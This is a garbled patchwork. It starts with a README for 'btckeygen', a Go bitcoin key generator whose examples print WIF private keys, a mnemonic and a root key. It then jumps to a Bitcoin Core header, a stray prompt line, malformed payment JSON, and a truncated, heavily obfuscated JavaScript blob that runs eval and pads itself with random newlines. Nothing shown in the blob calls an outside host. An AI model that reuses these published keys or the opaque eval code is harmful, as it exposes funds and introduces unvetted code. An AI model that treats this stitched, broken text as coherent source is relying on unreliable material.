btckeygen <img src="https://www.buybitcoinworldwide.com/img/segwit.png" width="100">
=========

[![license](https://img.shields.io/badge/license-WTFPL%20--%20Do%20What%20the%20Fuck%20You%20Want%20to%20Public%20License-green.svg)](https://github.com/modood/btckeygen/blob/master/LICENSE)

A simple and easy to use bitcoin key generator

*   BIP32 - Hierarchical Deterministic Wallets
*   BIP39 - Mnemonic code for generating deterministic keys
*   BIP43 - Purpose Field for Deterministic Wallets
*   BIP44 - Multi-Account Hierarchy for Deterministic Wallets
*   BIP49 - Derivation scheme for P2WPKH-nested-in-P2SH based accounts
*   BIP84 - Derivation scheme for P2WPKH based accounts
*   BIP173 - Base32 address format for native v0-16 witness outputs
*   SLIP44 - Registered coin types for BIP-0044


Can I trust this code?
----------------------

> Don't Trust. Verify.

> We recommend every user of this library audit and verify any underlying code for its validity and suitability.
>
> You can do so by using this tool: https://iancoleman.io/bip39/

Installation
------------

```
$ go get -u github.com/modood/btckeygen
```

Usage
-----

```
Usage of btckeygen:
  -bip39     bool   mnemonic code for generating deterministic keys (default false)
  -pass      string protect bip39 mnemonic with a passphrase (default "")
  -n         int    set number of keys to generate (default 20)
  -mnemonic  string optional list of words to re-generate a root key
```

Example
-------

**generate compressed public key:**

```txt
$ btckeygen

Bitcoin Address                    WIF(Wallet Import Format)                            SegWit(bech32)                             SegWit(nested)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
18nndBdh9VpfBsw8DJKg6KzYrC2o8v2KPo Kz1nmzu2DcLnHQy9kLbr794RAspLTf3ocx2jD2UnZRHN2EGuregS bc1q24c67qhugfla6zl3jj7x5uc48y6z5q7eecua4x 38fupM9MgfLj7fu2DWyXqnk9N9Um757G7D
1zdJnv2PZjP8EkfNJo27sotRntNyZCjEw  L3KR1wo35ngz4ATuAcciEXRrYAyosSB6s6XUP43H834hXpNqNNqC bc1qptnqgetfx7y220hwy3tl565mc73s75nq05u4mu 3HkC5ajZungAeFg2KjLUpV9Xa8Ahfw3Sqz
1Fw7MmDLMU5vGiLLqMKDdwRTPPMUaZi5vZ L1yEQi2D3YUyxcyNDmkUS2aHk8Tw3q7sF2DLEiamMr8gF79xhzXr bc1q50xc0sp2jnljv93el3at0v62gtv3dtwc2neh4q 338J9irj1kUN3CLVCo92oMizvPaYohq4BV
1Q4jALMrXo7iV5aGhgvFKoFgPxPFyRCMBU L2epjvSWacyZ1yUxLs6XUaJHCNPRzkTRZ89nxuMDM7eAQSKG1m2A bc1qlnl4t3l0sn0sllyu749qnj94edsstspd2w36ft 3GM6dMTEUrXi2oUhffqWzbwdUBb5wcFFRH
1MkQLmfcEcrjHDWVu3jZDQjCatZKzNZqWv KwHTiPwM5YpspUaHhvT7Cd5cePcXD1NtiygKpkMebo42jYPidhSU bc1quwt795fwxemp7vq5328xptvjwwpeh2036etjk7 3KRYMYGyNg8tZh9z43MDHowZ9SLqVyxvvx
17TxrHkbZftp2bxDehpikZWmEZvMvnzSXp L1RzZbyGa8EFfodabAB9jCcekR8FkzDDkmXvqTKkPvfhwN178h68 bc1qgm4rp4ha8fxuhqz40klqu65t528uz2q2gwlcvp 3FD42UuPBKwAfoXbEd5oCcUvrebpuhwDtW
1FmHRVvhtvL6GCsJEtpbHx7PqHMH13iZR9 Kx8akR9U1tdUSt24pW3WgAapDCiyf5t915YfHmQCSQ2zETHVN4fX bc1q58cutg45zz9d20jr6nsah0rf2vtx7falvl0jgc 3PHHzdZhM2QD4fDQHS7bnYx3ArCzYeQ3rv
1LHgqpG2zbW9PnhgNN5pNMJR94zZQrrjho L3AeREULfYV5Jq5quM7v5iYLPQ9aME6tEXnPQrDiCaxfGdTqMKFu bc1q6wfym27yfmvk4j3kvetjm0900wnzum4ys8a82q 34UKCs4q2NoG8MqZ17KNnNh1hfS173pMxp
1BC6VCkmTqsqRPMyThAjBtMW7QmpeUP6pa KzP7DYWscsvh5RdRnNh1nabjp7H431GxkEJLdxHJ9qZiHKr8kKQA bc1qdl9xnsvlj0ktqyy27v7lnkryq5t83yfgucuks8 3Ax9TfbihnUecfQFyfFMcN3wCAqcbhY5nX
13SY8L4wpmP45LtWDaX187WKDc864H1Qnf L5MprHUJ3HohKCi2MYLW7BR7ah321kqcQtecao9PyXsZ2xA4wb5P bc1qrtz2yvkg2dxrtqwdl08eaf0tkmd4ly9wct42tf 3JJGAp2cXkTpZGHCVWugLgEryyJ2nMC2po

```

**generate bip39 mnemonic with passphrase:**

```txt
$ btckeygen -bip39 -pass=123456 -n 10

BIP39 Mnemonic:    voyage blind unit shoulder yellow attitude mule all hire above obvious swap
BIP39 Passphrase:  123456
BIP39 Seed:        f4b8043e3b3b4d0b9e3c7cda81d6868c331aaecc80555dc7b2d0edce6b73ea50a91d67586f7461cd46caccee6e240a598a9aaa3063cdd9bec65a3d24d3aa551b
BIP32 Root Key:    xprv9s21ZrQH143K45MBGTeN7zrQxBgh7v3XNtAMrQvYBfm6xdtaVkjCFNyFHZ262PpMoiaA8JEFGUDPVV6qzB459nGgR1mjuigdTaG2NsKr5BG

Path(BIP44)        Bitcoin Address                    WIF(Wallet Import Format)
----------------------------------------------------------------------------------------------------------
m/44'/0'/0'/0/0    1LaDeWmc3oTSMjY1nZ2kiY9dFp9g1ySEem L5aA9x2EQar8Fe3yiwjLko39uGU8Unba4ZQ1kE8pejNAqJqpdbpY
m/44'/0'/0'/0/1    16xFS1oZW6ReE2CPhP59J875wE3PJd6GDG KyjJ9A1k646PoVWu67NcvhjBC6Y7ReofBUjmnBc4cgNXeGp8KWbJ
m/44'/0'/0'/0/2    1HkiKju2QSSWN1vvq6AU8jZ8MdExsZmpjw L2R4CE1jN7gE9Lhmm1oM2ELFjdn4etcxUuQm7YbFEFMxakdPu9rX
m/44'/0'/0'/0/3    1JAHQXAr5UfYpxVTaQnXuLv5xSuNY9CBpx L4Xf2kUs4vB9ayke59FVzCcZWVg8zA3MedR2QZwQHea6ubZi9Rko
m/44'/0'/0'/0/4    1L3aX9Zb4Be6goHdD2ruGaevsfiZ1Z2KeF Kx9YmkB39dGuo7dZXctc1jsjDRxrKcsiz6pWRJAAcNYydM3Z3rqE
m/44'/0'/0'/0/5    1BJ8zZMavS7MXU9hjV6atdHkumLbdvUhS1 KyjR4qQrEQ5siwPW1BoYtzLMhaFve1AqmHF2XTEjpZuH9D4ghFSf
m/44'/0'/0'/0/6    18V5CgntMUSqaDoBTDJg8UFv6vHhrYwK8o L5ZV2cycbbfetQR1HM6fcqkghUKyaKo5YE2PeDHBYg3qfwGMbJAb
m/44'/0'/0'/0/7    19euAnbCCWkfBZ88HrTG9FYY8KtcDBNWXk L4M78czByXYWsuwjcaFsAskfA86S6YgFSMtoRg62YYdQ1SNGPofX
m/44'/0'/0'/0/8    1MzQpwKs2gmAgNQmdJ946Rjj6ooxg5q3oE Kzd7bpaKaTsshfU9Hfn5WGGnEDph3XRfbgPFkkaVgsno2x6ng1ii
m/44'/0'/0'/0/9    1B6myJyMjNJyR3xCYnBeVjB4ENarhhRnYc L3vqyjSkzSiRumoN5D69hhYLCeJ6v1zwfbTGAEEgBnr5gntwURPj

Path(BIP49)        SegWit(nested)                     WIF(Wallet Import Format)
----------------------------------------------------------------------------------------------------------
m/49'/0'/0'/0/0    3GPKjBFRrXnmKLHJtqbiBgXQx9N4UQQ1m3 KzfvJ9kCBswJFEnEqtVwLguq7cWfx84o6qWxiT8HAWASuT1ScHMJ
m/49'/0'/0'/0/1    3MxC93Ny5Y6WQSbPwT3nVz1uU1vohASehb L2moJqSFws3vyeSFnTSeWpGGqXwCMDt3vaH4sFpHCgq7PDnU5upT
m/49'/0'/0'/0/2    38R8oVGe9RdFwjWqyiespp1ZCLQECnULkT KzfHcbSz19fhoUEVDuk1x4FzQwaPHdtoSEhap2CDzQL835x1G7CG
m/49'/0'/0'/0/3    35afr7YCmVLEQGUxCNEit9NnXFtJCAEnPV KyD6FFguKDss5QTMXqFD3tjrVTTKB1vcsPhwSepcRRts7ZkzSWFS
m/49'/0'/0'/0/4    3CAwxE45dhEvYC5gV8zhkETRQEK4SZV5uZ KzRKJPFqqMkV324sLP3XHJa95Zc1wrW1yF5m6pvmx2Dy2ve26qfe
m/49'/0'/0'/0/5    35mcCZ6dLsbcxZsv664ucN3pcQWbvob1c4 L23T8kYXzEffy32R6u8CdbDLph2xqXUkS4tNd4WuxQwGZAefrRAY
m/49'/0'/0'/0/6    3E1DWJt7eR4wVMmQHQur7mNbx2hUCpXNhp L5PyJjHH5sp1ZjBtupZrYHjVAWp6mxa2t4AsXdYr56CT1KtDAuYv
m/49'/0'/0'/0/7    347d6kiUQmyoR1sZ9DdgE43rBpHqGHKGsJ L4Z4yLTuhUWWtFZVEzL2Y8dMjuFGt8nJcDNzBg6m2qhQpMntJCg3
m/49'/0'/0'/0/8    3NkvBbq6wGKLMvjD1jw5R6662SGKA9J2bU L1YLja4mc8wxbqg5zMqPm18JT9RNT6vbkKVs17VAnXKSR6QNRVcp
m/49'/0'/0'/0/9    3GSbNfZZ2pbtzUQ1cdnJFXniB6j9Ds1FLC KzBVtGieeVCav3rvEYD9Rs7QtjN6HAZYQvQTD1rw3pLcZTWkayVZ

Path(BIP84)        SegWit(bech32)                             WIF(Wallet Import Format)
------------------------------------------------------------------------------------------------------------------
m/84'/0'/0'/0/0    bc1q84kvjqueplk6h80x89j4mjujvq3svfwcz8pavd KzaU5N8JLHEv8fwMmfjvxahD556a26QDDsGM8ETKrTUVSnTocS19
m/84'/0'/0'/0/1    bc1qw77nhsl2dsquhnpej0d7dua9wdptm8q8r6xv6e L2mTAeqLhJmmf9hK1MZ43t73cqwc7t1pg5yJHbhdYuiLPajmxLJU
m/84'/0'/0'/0/2    bc1qg85tc9ugn76qa6exgwu3rgxcmmjjy0jrn7d6hw L48Zk1B99S9FyKKcoD7KP8pEJ5WxsTW7d8wvRxVNypwdiZ1wckYf
m/84'/0'/0'/0/3    bc1qnzwg3cnadxqtvkaj420aj2kz506cd8pxh30e0x KwMpidUmtdp536ZA5sH4Tqn9nhmKMs93DUkN4WtQjksVyehi9qP7
m/84'/0'/0'/0/4    bc1qrn99yrfes85zq76rx877kgaw2kc7jeqja4m0f3 L2JSF9vH9oV8mqZPJjmbsswjqxdevhuMKcNyHZB3hfcpe2r79ena
m/84'/0'/0'/0/5    bc1qqqmmm033m2pzpawjy3m96nw7fu76a8l08wxykt KwUnSCNCQCLBymQPLwx62odRfEn4xwSKo9DRa3TgfXjG8Egw4cXq
m/84'/0'/0'/0/6    bc1q00qctf0uvvhd4kr7qsr5s90mwpc9466z6rxpre L4stA9VYKnRC8cEXk61HAFzqPHxSVcaUkPbynFc3wci8BxPf6wkP
m/84'/0'/0'/0/7    bc1qmntu8hq7cg799x42lw4apn63s6w0pjyjy60gep L35w9XduSfYhBDgXDzTKpf4y7f1VWT4uozTTE9xGonWdKa8XiZnN
m/84'/0'/0'/0/8    bc1q8ydc6runthe97n6k7slt5xqeh9dl8enl6kvk0j L1p29HYEgB7f1HGh1vEnneuzne8D7LaEPt5AgnArNnJ2LtiemwUK
m/84'/0'/0'/0/9    bc1qw4jlevwft2yw08g9auga8vtk0zsvzxfmm4jmlc L2p5DvXgJ8xLq6hjVuaWeyZe6pyPRP8hCbW7me6UVHfquNVoK8QP

```

**re-generate a root key with existing mnemonic:**

```txt
$ btckeygen -bip39 -pass=123456 -mnemonic "voyage blind unit shoulder yellow attitude mule all hire above obvious swap"
```

License
-------

This repo is released under the [WTFPL](http://www.wtfpl.net/) – Do What the Fuck You Want to Public License.
// Copyright (c) 2009-2010 Satoshi Nakamoto
// Copyright (c) 2009-2014 The Bitcoin developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or http://www.opensource.org/licenses/mit-license.php.

#ifndef BITCOIN_WALLET_ISMINE_H
#define BITCOIN_WALLET_ISMINE_H

#include "key.h"
#include "script/standard.h"

class CKeyStore;
class CScript;

/** IsMine() return codes */
enum isminetype
{
    ISMINE_NO = 0,
    ISMINE_WATCH_ONLY = 1,
    ISMINE_SPENDABLE = 2,
    ISMINE_ALL = ISMINE_WATCH_ONLY | ISMINE_SPENDABLE
};
/** used for bitflags of isminetype */
typedef uint8_t isminefilter;

isminetype IsMine(const CKeyStore& keystore, const CScript& scriptPubKey);
isminetype IsMine(const CKeyStore& keystore, const CTxDestination& dest);

#endif // BITCOIN_WALLET_ISMINE_H

u0_a253@localhost
#define struct union /* Great space saver */
https://api.sandbox.checkout.com/payments/pay_wugo7nun52aetgpgnyzyzvghnu
{
  "destination": "646180146005563036",
    "type": "STP",
 "id": ''0001610005563036",
    "id": "5439243828642005",
   "id":"src_nxc36gtdwjtuxfeg2vsy722m4e",
    "first_name": "John",
    "last_name": "Smith",
  },
  "amount": 100,
  "currency": "GBP",
  "fund_transfer_type": "FD",
  "reference": "ORD-5023-4E89",
}
(function(){function h(w){return w}var f=function(w,a,R,T,p){if(!(p=(T=a,k.trustedTypes),p)||!p.createPolicy)return T;try{T=p.createPolicy(w,{createHTML:D,createScript:D,createScriptURL:D})}catch(Q){if(k.console)k.console[R](Q.message)}return T},D=function(w){return h.call(this,w)},k=this||self;(0,eval)(function(w,a){return(a=f("ad",null,"error"))&&1===w.eval(a.createScript("1"))?function(R){return a.createScript(R)}:function(R){return""+R}}(k)(Array(7824*Math.random()|0).join("\n")+'(function(){var Tf=function(T,w,p,R){return((p|T)%3||(R=Object.prototype.hasOwnProperty.call(w,wi)&&w[wi]||(w[wi]=++ah)),(p^33)%T)||("function"===typeof w?R=w:(w[Rh]||(w[Rh]=function(h){return w.handleEvent(h)}),R=w[Rh])),R},G=function(T,w,p,R,h,k,a,D,Q,f,O){if(!((R+7)%8)){if(!(A.call(this,h),a=p)){for(f=this.constructor;f;){if(D=Tf(4,f,8),Q=pr[D])break;f=(k=Object.getPrototypeOf(f.prototype))&&k.constructor}a=Q?"function"===typeof Q.V?Q.V():new Q:null}this.A=a}if(!((R^(((R<<1)%11||(a.classList?a.classList.remove(k):C(14,k,8,p,h,a)&&y(62,h,Array.prototype.filter.call(c(30,h,a),function(F){return F!=k}).join(w),a)),R+2)%8||(O=!!(h=p.gJ,(h|w)-~(h&w)+~(h|w))),23))%9))if(k&&k.once)h$(0,true,40,w,Q,D,a,h,k);else if(Array.isArray(a))for(f=w;f<a.length;f++)G(10,0,false,12,h,k,a[f],D,Q);else D=Tf(4,D,13),Q&&Q[kZ]?Q.W.add(String(a),D,p,y(T,null,k)?!!k.capture:!!k,h):W(14,false,D,p,k,h,a,Q);return O},t$=function(T,w,p,R,h,k,a,D,Q,f){return(((w>>1&9||(p(function(O){O(R)}),f=[function(){return R}]),w<<1)%12||"number"===typeof h||!h||h.I||((Q=h.src)&&Q[kZ]?DW(4,p,h,10,Q.W):(D=h.proxy,a=h.type,Q.removeEventListener?Q.removeEventListener(a,D,h.capture):Q.detachEvent?Q.detachEvent(r(19,13,"on",a),D):Q.addListener&&Q.removeListener&&Q.removeListener(D),QW--,(k=c(10,Q))?(DW(4,p,h,T,k),k.B==p&&(k.src=R,Q[fr]=R)):OC(16,22,true,h))),w)-1)%7||I.call(this,p,R||FJ.V(),h),f},y=function(T,w,p,R,h,k,a){return(T^414)%(((T<<2)%5||(R=typeof p,a="object"==R&&p!=w||"function"==R),(T-3)%4)||(k=C(14,R,10,w,p),(h=k>=w)&&Array.prototype.splice.call(R,k,1),a=h),13)||("string"==typeof R.className?R.className=p:R.setAttribute&&R.setAttribute(w,p)),a},Cr=function(T,w,p,R,h,k,a,D){if(1==((w^788)&7))if(h=R.length,h>p){for(k=(a=Array(h),p);k<h;k++)a[k]=R[k];D=a}else D=[];return(w<<1)%((w+3)%11||(D=(k=z[p.substring(T,3)+"_"])?k(p.substring(3),R,h):t$(3,5,R,p)),11)||(p=function(Q){return R.call(p.src,p.listener,Q)},R=A$,D=p),D},r=function(T,w,p,R,h,k,a,D,Q,f){if(4==(((w>>1)%((w-5)%22||(f=!!(h=p.Nr,(h|R)-~(h&R)+~(h|R))&&G(10,R,p,38)),11)||(this.type=p,this.currentTarget=this.target=R,this.defaultPrevented=this.S=false),w<<1)%12||(a=R,a=(D=a<<13,~a-~D+2*(a&~D)),a=(k=a>>17,-(a&k)-1-~a+(~a&k)),a=(Q=a<<5,-2-(a|~Q)-(~a|Q)),(a=-2*~h+~(a|h)-(~a^h)+2*(a|~h))||(a=1),f=p^a),w+5&15))a:{switch(D){case 1:f=a?"disable":"enable";break a;case 2:f=a?"highlight":"unhighlight";break a;case p:f=a?"activate":"deactivate";break a;case k:f=a?"select":"unselect";break a;case R:f=a?"check":"uncheck";break a;case h:f=a?"focus":"blur";break a;case 64:f=a?"open":"close";break a}throw Error("Invalid component state");}return(w^220)%T||(f=R in jR?jR[R]:jR[R]=p+R),f},yW=function(T,w,p,R,h,k,a,D,Q,f,O,F){if(!((k^259)%3))if(Array.isArray(h))for(O=R;O<h.length;O++)yW(T,w,p,0,h[O],11,a);else f=y(25,null,a)?!!a.capture:!!a,p=Tf(4,p,9),T&&T[kZ]?T.W.remove(String(h),p,f,w):T&&(Q=c(13,T))&&(D=Q.jG(p,f,w,h))&&t$(3,6,0,null,D);if(!((k^800)&2))a:{for(a=R;a<h.length;++a)if(D=h[a],!D.I&&D.listener==T&&D.capture==!!p&&D.h==w){F=a;break a}F=-1}return F},H=function(T,w,p,R,h,k,a,D,Q){if((w|8)&19||(p.push((a=R[0]<<24|R[1]<<16,k=R[2]<<8,(a&k)+(a&~k)+(~a&k))|R[3]),p.push(R[4]<<24|R[5]<<16|R[6]<<8|R[7]),p.push((D=R[8]<<24|R[9]<<16,h=R[10]<<8,(D|0)+(h|0)+~h-(D|~h))|R[11])),!((w+9)%19)){for(p=[];R--;)p.push(255*Math.random()|0);Q=p}if(2==(w+1&(3==((2==(w>>1&11)&&(h=L(p),h&128&&(h=~(h&R)- -1-2*~(h|R)+2*(~h^R)|L(p)<<7),Q=h),w-8)&T)&&(h.v=(a=di(2,3,h,B(R,h))<<24|di(2,3,h,B(R,h))<<16|di(2,3,h,B(R,h))<<8,k=di(2,3,h,B(R,h)),(a&k)-p*(~a^k)+(a|~k)+(~a|k)),h.o=void 0),15)))if(k="array"===cX("null",h,"array")?h:[h],this.G)R(this.G);else try{a=[],D=!this.R.length,W(62,0,this,[gi,a,k]),W(42,0,this,[iq,R,a]),p&&!D||Gf(false,this,p,true,true)}catch(f){c(64,":",f,this),R(this.G)}return Q},C=function(T,w,p,R,h,k,a,D,Q,f,O){if(1==((1==(p-3&11)&&(k.classList?D=k.classList.contains(w):(a=c(6,h,k),D=C(14,a,T,R,w)>=R),O=D),p-5)&3))a:if("string"===typeof w)O="string"!==typeof h||1!=h.length?-1:w.indexOf(h,R);else{for(k=R;k<w.length;k++)if(k in w&&w[k]===h){O=k;break a}O=-1}if(2==((p^191)&7)){for(D=a=0;D<R.length;D++)a+=R.charCodeAt(D),a+=a<<10,a^=a>>6;Q=(a+=a<<3,a^=a>>11,a+(a<<15))>>>0,k=new Number((f=(1<<h)-1,(Q|f)- -1+(~Q^f))),k[0]=(Q>>>h)%w,O=k}return O},WX=function(T,w,p,R,h,k,a,D){if(!((w+3)%2)){for(k=L(h),a=R;p>R;p--)a=a<<T|L(h);l(k,a,h)}return(w<<1)%4||(h=function(){return p()},p=function(){return R},h[this.H]=function(Q){R=Q},D=h),D},OC=function(T,w,p,R,h,k,a,D,Q,f){if(!(1==(w+3&5)&&(R.I=p,R.listener=null,R.proxy=null,R.src=null,R.h=null),(w-7)%4))for(a=h.length,Q="string"===typeof h?h.split(p):h,D=R;D<a;D++)D in Q&&k.call(void 0,Q[D],D,h);if(!((w<<1)%7))for(h in a=p,R.T){for(k=(D=p,R.T[h]);D<k.length;D++)++a,OC(16,T,true,k[D]);delete (R.B--,R.T)[h]}return f},c=function(T,w,p,R,h,k,a){if(2==(T+(2==(T-7&18)&&(p=w[fr],a=p instanceof YZ?p:null),6)&23))if(w.classList)Array.prototype.forEach.call(p,function(D,Q){w.classList?w.classList.add(D):C(14,D,20,0,"class",w)||(Q=xZ(7,23,"string","class",w),y(36,"class",Q+(0<Q.length?" "+D:D),w))});else{for(k in((h={},Array.prototype).forEach.call(c(38,"class",w),function(D){h[D]=true}),Array.prototype.forEach).call(p,function(D){h[D]=true}),R="",h)R+=0<R.length?" "+k:k;y(13,"class",R,w)}return 1==(T+9&(T>>1&7||(R.G=((R.G?R.G+"~":"E:")+p.message+w+p.stack).slice(0,2048)),(T^78)&7||(a=p.classList?p.classList:xZ(7,17,"string",w,p).match(/\\S+/g)||[]),15))&&(this.L=b.document||document),a},Ih=function(T,w,p,R,h,k,a){return(w^60)%(1==((((w-6)%6||(a=G(T,h,R,6)&&U(h,16,0,R)!=k&&(!(R.rJ&h)||R.dispatchEvent(r(19,15,4,16,32,p,k,h)))&&!R.kX),(w^911)&5)||(h.Uq(function(D){k=D},p,R),a=k),w)+8&3)&&(this.kX=this.kX),8)||(this.src=p,this.B=0,this.T={}),a},J$=function(T,w,p,R,h,k,a,D,Q,f){return 1==((1==(k+4&7)&&(zf.call(this,R?R.type:""),this.relatedTarget=this.currentTarget=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=this.offsetY=this.offsetX=T,this.key="",this.charCode=this.keyCode=T,this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=false,this.state=null,this.pointerId=T,this.pointerType="",this.K=null,R&&(p=this.type=R.type,w=R.changedTouches&&R.changedTouches.length?R.changedTouches[T]:null,this.target=R.target||R.srcElement,this.currentTarget=a,h=R.relatedTarget,h||("mouseover"==p?h=R.fromElement:"mouseout"==p&&(h=R.toElement)),this.relatedTarget=h,w?(this.clientX=void 0!==w.clientX?w.clientX:w.pageX,this.clientY=void 0!==w.clientY?w.clientY:w.pageY,this.screenX=w.screenX||T,this.screenY=w.screenY||T):(this.offsetX=R.offsetX,this.offsetY=R.offsetY,this.clientX=void 0!==R.clientX?R.clientX:R.pageX,this.clientY=void 0!==R.clientY?R.clientY:R.pageY,this.screenX=R.screenX||T,this.screenY=R.screenY||T),this.button=R.button,this.keyCode=R.keyCode||T,this.key=R.key||"",this.charCode=R.charCode||("keypress"==p?R.keyCode:0),this.ctrlKey=R.ctrlKey,this.altKey=R.altKey,this.shiftKey=R.shiftKey,this.metaKey=R.metaKey,this.pointerId=R.pointerId||T,this.pointerType="string"===typeof R.pointerType?R.pointerType:XJ[R.pointerType]||"",this.state=R.state,this.K=R,R.defaultPrevented&&Kr.Z.preventDefault.call(this))),k)+1&5)&&(Array.isArray(w)&&(w=w.join(a)),Q=R+h,""===w||void 0==w?(nr||(nr={atomic:false,autocomplete:"none",dropeffect:"none",haspopup:false,live:"off",multiline:false,multiselectable:false,orientation:"vertical",readonly:false,relevant:"additions text",required:false,sort:"none",busy:false,disabled:false,hidden:false,invalid:"false"}),D=nr,h in D?p.setAttribute(Q,D[h]):p.removeAttribute(Q)):p.setAttribute(Q,w)),f},h$=function(T,w,p,R,h,k,a,D,Q,f,O){if((2==(p-2&((p-7&3||(O=w),p>>2&9)||(w.I?k=true:(D=new Kr(R,this),a=w.h||w.src,h=w.listener,w.N&&t$(3,18,T,null,w),k=h.call(a,D)),O=k),14))&&(O=w&&w.parentNode?w.parentNode.removeChild(w):null),(p>>2)%12)||(e.call(this),w||ND||(ND=new Lr),this.af=null,this.SG=false,this.Wa=this.ri=this.Oq=null,this.Ka=void 0,this.Gs=null),!((p<<1)%5))if(Array.isArray(a))for(f=R;f<a.length;f++)h$(0,true,30,T,h,k,a[f],D,Q);else k=Tf(4,k,5),h&&h[kZ]?h.W.add(String(a),k,w,y(30,null,Q)?!!Q.capture:!!Q,D):W(5,false,k,w,Q,D,a,h);return O},DW=function(T,w,p,R,h,k,a){if(!((R|8)%6)){if(!p)throw Error("Invalid class name "+p);if("function"!==typeof w)throw Error("Invalid decorator function "+w);}return(R|T)%7||(k=p.type,k in h.T&&y(7,w,p,h.T[k])&&(OC(16,6,true,p),h.T[k].length==w&&(delete h.T[k],h.B--))),a},V=function(T,w,p,R,h,k,a,D,Q){if(!((h+8)%7)){if(a=window.btoa){for(w=(k=0,T);k<R.length;k+=8192)w+=String.fromCharCode.apply(null,R.slice(k,k+8192));p=a(w).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,T)}else p=void 0;Q=p}return(h|5)%5||(D=function(){},D.prototype=p.prototype,w.Z=p.prototype,w.prototype=new D,w.prototype.constructor=w,w.cs=function(f,O,F){for(var t=Array(arguments.length-R),g=R;g<arguments.length;g++)t[g-R]=arguments[g];return p.prototype[O].apply(f,t)}),Q},xZ=function(T,w,p,R,h,k,a,D,Q){return(w-5)%(w+((w<<((w^539)&11||(p.classList?Array.prototype.forEach.call(R,function(f){G(10," ",0,11,"class",f,p)}):y(24,"class",Array.prototype.filter.call(c(62,"class",p),function(f){return!(0<=C(14,R,6,0,f))}).join(" "),p)),1))%5||(D=typeof k,a=D!=R?D:k?Array.isArray(k)?"array":D:"null",Q=a==p||a==R&&typeof k.length==h),8)&T||(BX.call(this),this.W=new YZ(this),this.di=this,this.Ha=null),6)||(Q=typeof h.className==p?h.className:h.getAttribute&&h.getAttribute(R)||""),Q},qD=function(T,w,p,R,h,k,a,D){return(w>>((w-4)%5||(p.V=function(){return p.bF?p.bF:p.bF=new p},p.bF=void 0),1))%T||(a=function(){},h=void 0,k=uq(p,function(Q){a&&(R&&oh(R),h=Q,a(),a=void 0)},!!R)[0],D={hot:function(Q,f,O,F,t,g){if(!f)return F=k(O),Q&&Q(F),F;g=function(){h(function(d){oh(function(){Q(d)})},O)},h?g():(t=a,a=function(){(t(),oh)(g)})}}),D},W=function(T,w,p,R,h,k,a,D,Q,f,O,F,t){if(!((T>>1)%8)){if(((a=(f=(F=4==(O=0<(R||h.na++,h.iF)&&h.gi&&h.wi&&1>=h.ZR&&!h.j&&!h.U&&(h.$X||!R)&&0==document.hidden,h).na)||O?h.i():h.ca,f-h.ca),Q=a>>w,h).v&&(h.v^=Q*(a<<2)),h.Rf+=Q,h).g=Q||h.g,F||O)h.na=0,h.ca=f;!O||f-h.pa<h.iF-(k?255:R?5:2)?t=false:(D=B(R?136:236,h),l(236,h.C,h),h.R.push([HX,D,R?p+1:p]),h.U=oh,t=true)}if(!((T-((T+8)%10||p.R.splice(w,w,R),5))%9)){if(!a)throw Error("Invalid event type");if(!(f=(O=y(5,null,((F=c(9,D))||(D[fr]=F=new YZ(D)),h))?!!h.capture:!!h,F).add(a,p,R,O,k),f.proxy)){if(((f.proxy=(Q=Cr(0,11),Q),Q).src=D,Q).listener=f,D.addEventListener)lq||(h=O),void 0===h&&(h=w),D.addEventListener(a.toString(),Q,h);else if(D.attachEvent)D.attachEvent(r(19,43,"on",a.toString()),Q);else if(D.addListener&&D.removeListener)D.addListener(Q);else throw Error("addEventListener and attachEvent are unavailable.");QW++}}return t},eR=function(T,w,p,R,h,k,a,D,Q,f,O){return(w-((w+((w<<((w+2)%10||(O=(k=(D=p[T]<<24|p[(T|0)+1]<<h,Q=p[2*(T|2)- -1+(~T^2)]<<R,~Q-2*~(D|Q)+(~D|Q)),a=p[(T|0)+3],2*(k|0)+~(k&a)-(k&~a)-(k|~a))),2))%7||(O=f=function(){if(T.g==T){if(T.J){var F=[mE,a,p,void 0,D,Q,arguments];if(k==h)var t=(W(12,0,T,F),Gf)(false,T,false,false,true);else if(k==R){var g=!T.R.length;(W(22,0,T,F),g)&&Gf(false,T,false,false,true)}else t=SR(false,T,F,226);return t}D&&Q&&D.removeEventListener(Q,f,false)}}),9))%9||(T=h&4,a=(h|0)+(~h^3)-(h|-4),k=L(this),p=L(this),R=B(k,this),T&&(R=bq(192,(""+R).replace(/\\r\\n/g,"\\n"),0)),a&&P(M(R.length,2),this,p),P(R,this,p)),1))%6||(p=this,T={},k=p.$,a=function(F,t){return t=k.call(p,[UC]),h[F%21209*R%21209*35*(t|0)%21209*R%21209]},a[p.H]=function(F){T[3175*R%21209]=F},a[p.H](h),h=T,O=a),O},$Z=function(T,w,p,R,h,k,a,D){if(!((w+4)%4))a:{for(a in h)if(k.call(void 0,h[a],a,h)){D=R;break a}D=p}return(w^T)%7||(this.listener=k,this.proxy=null,this.src=h,this.type=a,this.capture=!!p,this.h=R,this.key=++vX,this.I=this.N=false),D},U=function(T,w,p,R,h,k,a,D,Q,f,O,F,t){if(!(w>>((w^189)&13||T.af&&T.af.forEach(p,void 0),2)&6)){for(k=R=0,h=[];R<p.length;R++)for(a=a<<T|p[R],k+=T;7<k;)k-=8,h.push(a>>k&255);t=h}if((w<<1)%8||(t=!!(h=R.X,(T|p)- -1+(h|~T))),1==(w+8&15))if(Q=R.W.T[String(k)]){for(a=(f=(Q=Q.concat(),true),p);a<Q.length;++a)(F=Q[a])&&!F.I&&F.capture==h&&(O=F.h||F.src,D=F.listener,F.N&&DW(4,p,F,7,R.W),f=false!==D.call(O,T)&&f);t=f&&!T.defaultPrevented}else t=true;return t},VW=function(T,w,p,R){return(w|1)&((w>>1&((w<<T)%10||(this.g=p),7))==T&&(R=Math.floor(this.zs+(this.i()-this.pa))),6)||(R=Math.floor(this.i())),R},uq=function(T,w,p,R){return Cr.call(this,0,8,T,w,p,R)},b=this||self,Z=function(T,w,p){p=this;try{PX(w,this,T)}catch(R){c(48,":",R,this),T(function(h){h(p.G)})}},ZW=function(T,w){for(var p,R=1,h;R<arguments.length;R++){for(p in h=arguments[R],h)T[p]=h[p];for(var k=0;k<MD.length;k++)p=MD[k],Object.prototype.hasOwnProperty.call(h,p)&&(T[p]=h[p])}},EC=function(T,w,p,R,h){return qD.call(this,8,16,T,w,p,R,h)},E,wt=function(){return W.call(this,3)},wi="closure_uid_"+(1E9*Math.random()>>>0),ND,aH=function(T){return 